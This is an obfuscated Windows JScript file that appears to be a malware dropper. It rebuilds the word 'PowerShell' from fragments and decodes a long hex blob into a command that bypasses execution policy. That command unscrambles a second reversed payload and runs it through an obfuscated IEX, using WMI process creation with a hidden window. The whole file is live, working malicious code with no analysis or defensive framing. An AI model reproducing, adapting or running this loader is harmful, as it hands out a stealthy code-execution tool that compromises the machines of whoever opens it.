

function tryy(str) {
    return str.split("").reverse().join("");
}

function A1() {
    return "winmgmts:Win32_Process";
}

function A2() {
    return "winmgmts:Win32_ProcessStartup";
}

function A3() {
    return "ate";
}



var ore=["2d457865637574696f6e506f6c6963792042797061737320245a4a4f55493d274434234337233732233732233032234536233936234636234136234432233032233337233237233136233836233334233936233936233336233337233136233432233032234433233736234536233936233237233437233335233936233936233336233337233136233432234233234437233232234635233432233837233033233232234435233536233437233937233236234235234435233237233136233836233336234235234237233032233437233336233536234136233236234634234432233836233336233136233534233237234636233634234337233032233732234432233732233032233437233936234336233037233337234432233032233637234436233432233032234433233337233237233136233836233334233936233936233336233337233136233432234233233932233732233736233037234136234532233133233133233434234632233237233736234532233237233536234536233936234336233436233536234436234532233737233737233737234632234632234133233037233437233437233836233732234332233436234636233836233437233536234434234133234133234435233536233037233937233435234336234336233136233334234532233336233936233337233136233234234336233136233537233337233936233635234532233437233636234636233337234636233237233336233936234434234235234332233732233736234536233936233237233437233335233436233136234636234336234536233737234636233434233732234332233937233437233437233432233832233536234436233136234536233937233234234336234336233136233334234133234133234435234536234636233936233437233336233136233237233536233437234536233934234532233336233936233337233136233234234336233136233537233337233936233635234532233437233636234636233337234636233237233336233936234434234235233032234433233637234436233432234233233932233732233336233936233337233136233234234336233136233537233337233936233635234532233437233636234636233337234636233237233336233936234434233732233832233536234436233136234534234336233136233936233437233237233136233035233836233437233936233735233436233136234636234334234133234133234435233937234336233236234436233536233337233337233134234532234536234636233936233437233336233536234336233636233536233235234532234436233536233437233337233937233335234235233032234435233436233936234636233637234235234233234434234337233732233932233437234536233536233732234232233732233","936234336233334233236233732234232233732233536233735234532233437233732234232233732233536234534233032233437233336233732234232233732233536234136233236234634233732234232233732234432233737233536234534233832233732234433233937233437233437233432234233233233233233233037233432233032234433233032234336234636233336234636233437234636233237233035233937233437233936233237233537233336233536233335234133234133234435233237233536233736233136234536233136234434233437234536233936234636233035233536233336233936233637233237233536233335234532233437233536234534234532234436233536233437233337233937233335234235234233233932233233233733233033233333233032234332234435233536233037233937233435234336234636233336234636233437234636233237233035233937233437233936233237233537233336233536233335234532233437233536234534234532234436233536233437233337233937233335234235233832233437233336233536234136233236234634234636233435234133234133234435234436233537234536233534234235233032234433233032233233233233233037233432234233233932233736234536233936233037233432233832233032234336233936233437234536233537233032234437233437233536233936233537233135234432233032233133233032233437234536233537234636233336234432233032234436234636233336234532233536234336233736234636234636233736233032233037234436234636233336234432233032234536234636233936233437233336233536234536234536234636233336234432233437233337233536233437233032234433233032233736234536233936233037233432234237233032234636233436234233233536234536234636233236233435233432233032234434233032234336233136233337234233233932233732233934233732234332233732234533233732233832233536233336233136234336233037233536233237234532233732233835233534234533233732234433233536234536234636233236233435233432273b2474657874203d245a4a4f55492e546f43686172417272617928293b5b41727261795d3a3a52657665727365282474657874293b2474753d2d6a6f696e2024746578743b246a6d3d2474752e53706c69742827232729207c20666f7245616368207b5b636861725d285b636f6e766572745d3a3a746f696e74313628245f2c313629297d3b246a6d202d6a6f696e2027277c4960456058"]

t78fgh0(rrdf() + hex2a(ore.join('')))


function hex2a(hex) {
    var str = '';
    for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}


function rrdf() {
	
	return  dfg() + hhewr() + tuhjdf()
}

function t78fgh0(strCommand){
   var strComputer = ".";
   var strCommand = strCommand;

   var objProcess = GetObject(A1());
   var objInParam =
objProcess.Methods_(hex2a("437265")+A3()).inParameters.SpawnInstance_();
   var objStartup =
GetObject(A2()).SpawnInstance_();
   objStartup.ShowWindow = 0;
   objInParam.CommandLine = strCommand;
   objInParam.ProcessStartupInformation = objStartup;
      var objOutParams =objProcess.ExecMethod_( hex2a("437265")+A3(), objInParam);
}

function dfg() {
	
	return "PoW" 
}
function hhewr() {
	
	return "ersh"
}
function tuhjdf() {
	
	return  "ell "
}